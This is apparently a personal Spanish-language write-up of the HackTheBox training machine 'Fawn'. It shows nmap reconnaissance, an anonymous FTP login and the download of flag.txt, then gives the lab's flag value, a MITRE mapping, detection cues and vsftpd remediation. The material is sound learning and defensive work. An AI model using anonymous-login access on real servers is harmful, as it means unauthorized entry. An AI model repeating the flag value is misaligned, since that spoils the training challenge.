---
tags:
  - htb
  - starting-point
  - tier-0
  - easy
  - linux
  - ftp
  - anonymous-login
  - default-credentials
  - Terminada
ip: 10.129.40.132
os: Linux
difficulty: Easy
status: Terminada
tiempo: 1h 30m
fecha_inicio: 2026-06-10
fecha_completada: 2026-06-10
puntos: 150
mitre_tactics:
  - TA0001 Initial Access
  - TA0007 Discovery
  - TA0009 Collection
mitre_techniques:
  - T1078.001 Default Accounts
  - T1083 File and Directory Discovery
  - T1005 Data from Local System
---

# 🖥️ Fawn — Linux — Easy (Starting Point Tier 0)

> [!info] Resumen
> **IP:** `10.129.40.132` | **OS:** Linux | **Tier:** SP-0 | **Tiempo:** 1h 30m
> FTP con anonymous login habilitado. Acceso directo a `flag.txt` en el directorio raíz del servidor.

---

## 1. Reconocimiento

```bash
nmap -sCV 10.129.40.132
```

| Puerto | Servicio | Versión | Hallazgo clave |
|--------|----------|---------|----------------|
| 21/TCP | FTP | vsftpd 3.0.3 | `ftp-anon: Anonymous FTP login allowed` |

**→ Vector inmediato:** anonymous FTP. Nmap lo confirma con el script `ftp-anon`.

---

## 2. Explotación

```bash
ftp 10.129.40.132
# Name: anonymous
# Password: (Enter)
# 230 Login successful.

ftp> ls -la
# -rw-r--r-- 1 0 0 32 Jun 04 2021 flag.txt

ftp> get flag.txt
# local: flag.txt  remote: flag.txt → descargado

# En terminal local:
cat flag.txt
```

> [!success] Flag
> `035db21c881520061c53e0536e44f815`

**Nota técnica:** FTP no otorga shell — da acceso a archivos. `get` descarga el archivo localmente, luego `cat` se ejecuta en tu terminal, no en el servidor.

---

## 3. MITRE ATT&CK

| Táctica | Técnica | ID | Uso |
|---------|---------|----|-----|
| Initial Access | Default Accounts | T1078.001 | Login `anonymous` sin contraseña |
| Discovery | File & Directory Discovery | T1083 | `ls -la` en servidor FTP |
| Collection | Data from Local System | T1005 | `get flag.txt` |

---

## 4. Detección & Remediación

**Blue Team detecta:**
- Log vsftpd: `CONNECT` + `LOGIN anonymous` desde IP externa
- IDS/firewall: tráfico TCP/21 no autorizado
- Tráfico en texto plano capturablecon tcpdump/Wireshark en el segmento

**Remediación:**
- `anonymous_enable=NO` en `/etc/vsftpd.conf` → reiniciar servicio
- Reemplazar FTP por SFTP (SSH port 22, cifrado completo)
- Si FTP es necesario: chroot jail + lista blanca de IPs

---

## 5. Lecciones

- `ftp-anon` de nmap detecta anonymous login automáticamente — siempre incluirlo en el escaneo inicial con puerto 21 abierto
- FTP ≠ shell: es acceso a archivos vía `get`/`put`, no ejecución de comandos
- CVE-1999-0497 — anonymous FTP es una misconfiguration, no un bug de código

**Bloqueado:**

| Fase | Causa | Fix |
|------|-------|-----|
| HTB quiz | `ftp -h` no funcionaba | La respuesta era `ftp -?` |

---

## 6. Conexiones

- Mismo vector (default creds en servicio remoto): `[[HTB/Meow/Meow]]` (Telnet), `[[HTB/Explosion/Explosion]]` (RDP)
- Siguiente nivel FTP: `[[HTB/Crocodile/Crocodile]]` (FTP + web login)
- Ver: `[[Técnicas/Default-Credentials]]`

**Referencias:** [HackTricks FTP](https://book.hacktricks.xyz/network-services-pentesting/pentesting-ftp) · [CVE-1999-0497](https://nvd.nist.gov/vuln/detail/CVE-1999-0497) · [IppSec Fawn](https://www.youtube.com/watch?v=CU_tCe3rVr8)
